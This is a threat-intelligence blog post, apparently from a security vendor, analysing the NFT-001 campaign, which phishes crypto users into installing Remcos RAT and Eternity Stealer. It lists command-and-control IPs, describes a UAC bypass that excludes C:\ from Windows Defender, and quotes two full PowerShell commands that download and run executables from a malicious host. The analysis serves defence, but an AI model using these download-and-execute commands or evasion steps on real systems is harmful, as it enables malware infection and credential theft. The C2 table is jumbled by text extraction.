An NFT’s ownership is recorded\n[in the blockchain, and it can be sold and traded. NFTs differ from cryptocurrencies, which are](http://%20from%20cryptocurrencies/)\nmostly [fungible, in that NFTs are unique and non-substitutable. The NFT market is booming,](https://www.merriam-webster.com/dictionary/fungible)\nwith trading volume exploding by over 20,000 percent from 2020 to 2021. Cybercriminals\nhave rushed to exploit this trend, which the Morphisec Threat Labs team has previously\n[examined in a white paper. The Threat Labs team now has fresh research on the crypto and](https://blog.morphisec.com/hubfs/Journey%20of%20a%20Crypto%20Scammer%20-%20NFT-001%20%7C%20Morphisec%20%7C%20Threat%20Report.pdf?hsCtaTracking=a12ee850-4ae0-4fbe-9598-4c349ae17839%7Ca47f81c3-f2ef-4808-9f32-b9fff61156a8)\nNFT malware NFT-001, which first surfaced in November 2020.\n\nThe NFT-001 attack sequence typically includes the following steps:\n\nAttackers target users in crypto and NFT communities on Discord and other forums\nThe victim receives a private phishing message related to an NFT or financial\nopportunity. The message includes a link to a fake website and malicious app that\npromises an improved user experience\n\nThe downloaded malware unpacks a remote access trojan (RAT) that is used to steal\nbrowsing data, install a keylogger, and other surveillance functionalities\n\n\n-----\n\nThe attacker then uses the data for identity theft and to steal the victim s wallet and\nother possessions\n\n[The threat actor has now switched from the Babadeda crypter to a new staged downloader](https://blog.morphisec.com/the-babadeda-crypter-targeting-crypto-nft-defi-communities)\nwhile using the same delivery infrastructure as before. The new downloader adds increased\n[defense evasion abilities to this malware.](https://attack.mitre.org/tactics/TA0005/)\n\n## New NFT-001 Technical Details\n\nMorphisec Labs has tracked several waves of the NFT malware delivering the Remcos RAT\nsince it first surfaced. In June 2022 we found a shift in the crypter used to deliver the\nRemcos RAT. The Babadeda crypter has now been discarded for a new staged downloader.\n\n\n**Date** **Packer/Crypter**\n\n**/Downloader**\n\n\n**Payload**\n\n\n**C2** **Port**\n\n\n11/2020 07/2021\n\n07/2021 08/2021\n\n08/2021 10/2021\n\n11/2021 12/2021\n\n12/2021 02/2022\n\n01/2022 03/2022\n\n\nCustom .NET packer Remcos 95.217.114[.]96\n\n37.48.89[.]8\n\n94.23.218[.]87\n\n\nBABADEDA using DLL\nsideloading with IIS Express\n\nBABADEDA using DLL\nsideloading with Adobe /\nTopoEdit\n\nBABADEDA using DLL\nsideloading with Link.exe\n\n\n4782\n\n4783\n\n\nCrypto Obfuscator (.NET) Remcos 135.181.17[.]47 4783\n\n\nBABADEDA BitRAT 135.181.140[.]182\n\n135.181.140[.]153\n\n135.181.6[.]215\n\n\n7777\n\n\nRemcos\n\nAsyncRAT\n\n\nRemcos 193.56.29[.]242 4783\n\nRemcos 157.90.1[.]54 4783\n\nRemcos 145.239.253[.]176 4782\n\n\n65.21.127[.]164 4783\n\n4449\n\n\nApril 2022 BABADEDA using DLL\nsideloading with Adobe\n\n\n-----\n\n07/2022 *Active\n\n06/2022 *Active\n\n\nBABADEDA using DLL\nsideloading with Mp3tag.exe\n\n\nDownloader Remcos 144.91.79[.]86 4444\n\n4783\n\n\nRemcos 65.108.9[.]124 4783\n\n\nThe malware delivery hasn’t changed much. It sends a user a private message enticing\nthem to download a related application supposedly granting the user access to the newest\nfeatures. Below is an example of the phishing message targeting users of “Dune”—an\nEthereum-based crypto data analytics platform.\n\nIf a user clicks the hyperlink in the message, it directs him to a decoy website that mimics the\noriginal. There, the user is prompted to download the malicious “installer” which infects the\nvictim’s machine with the Remcos RAT.\n\n\n-----\n\nFor more information on the infrastructure, read Morphisec’s previously mentioned white\n[paper, “Journey of a Crypto Scammer.”](https://blog.morphisec.com/hubfs/Journey%20of%20a%20Crypto%20Scammer%20-%20NFT-001%20%7C%20Morphisec%20%7C%20Threat%20Report.pdf?hsCtaTracking=a12ee850-4ae0-4fbe-9598-4c349ae17839%7Ca47f81c3-f2ef-4808-9f32-b9fff61156a8)\n\n## The New Staged Downloader\n\nThe threat actor keeps the first stage “installers” with a low detection rate.\n\nThe execution starts by performing a User Account Control (UAC) bypass. It hijacks the\ndefault handler for the ms-settings protocol and sets it to execute a Powershell command\nthat adds the C:\\ folder to the Windows Defender exclusion list. The code that performs this\n[UAC bypass technique is well documented in the open-source repository. But the attacker](https://github.com/AzAgarampur/byeintegrity-lite)\nemployed it extremely poorly—he didn't even bother to remove unnecessary WinAPI calls,\nsuch as printing to the console.\n\n\n-----\n\nAfter excluding the C:\\ folder from Windows Defender, the following Powershell commands\nare de-obfuscated and executed:\n\n1) The first Powershell command downloads and executes a plain Remcos RAT (C2 144.91.79[.]86).\n\npowershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle\nHidden $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest\nhttp://rwwmefkauiaa[.]ru/bs8bo90akv.exe -OutFile\n\\\"$env:appdata/Microsoft/dllservice.exe\\\"; Start-Process -Filepath\n\\\"$env:appdata/Microsoft/dllservice.exe\\\"\n\nThe C2 used in that Remcos RAT was also seen in the wild in samples using the Babadeda\ncrypter. This bolsters our suspicion it's the same threat actor.\n\n2) The second Powershell command downloads and executes Eternity Stealer which steals\nsensitive information from a victim’s machine such as:\n\nBrowser information like login credentials, history, cookies\nVPN and FTP client data\nMessaging software data\nPassword management software data\n\npowershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle\nHidden $ProgressPreference = 'SilentlyContinue'; mkdir\n\\\"$env:appdata/Microsoft/AddIns\\\"; Invoke-WebRequest http://rwwmefkauiaa[.]ru/u84ls.exe\n-OutFile \\\"$env:appdata/Microsoft/AddIns/exclusions.exe\\\"; Start-Process -Filepath\n\\\"$env:appdata/Microsoft/AddIns/exclusions.exe\\\"\n\n[We also noticed a variant of this downloader in the Tandem Espionage campaign shares](https://inquest.net/blog/2022/05/25/tandem-espionage)\ncommonalities with this campaign:\n\nThere is a similar UAC bypass technique using fodhelper.exe (less evasive\nimplementation)\nDownloading and executing two malicious executables (Arkei stealer and Eternity\nstealer)\nThe Eternity stealer is downloaded by the exact same Powershell command as the\nsecond Powershell command from the same URL\n\n\n-----\n\nThough the URL downloading the Eternity stealer is the same, we think these may be two\ndifferent threat actors that used the same downloader as a service.\n\n## Defending Against NFT Malware Like NFT-001\n\nThe crypto and NFT communities are on the cutting edge of financial innovation, and they\nare a lucrative target for attackers. This naturally means there’s more scope for threat actors\nto exploit gaps in such rapidly evolving technology. This new staged downloader for NFT-001\nis more evasive than the earlier version, increasing its ability to sneak past traditional\ncybersecurity solutions. According to the latest Picus report, defense evasion is now the\n[most popular tactic among malware operators.](https://www.picussecurity.com/resource/blog/red-report-2021-top-ten-attack-techniques)\n\nThis tactic is popular because there aren’t many effective tools against defense evasion. One\nsuch tool is Morphisec’s revolutionary Moving Target Defense (MTD) technology, which\ncomprehensively prevents defense evasion techniques. Unlike other cybersecurity solutions\nwhich focus on detecting known patterns with response playbooks, MTD preemptively blocks\nattacks on memory and applications and remediates the need for a response.
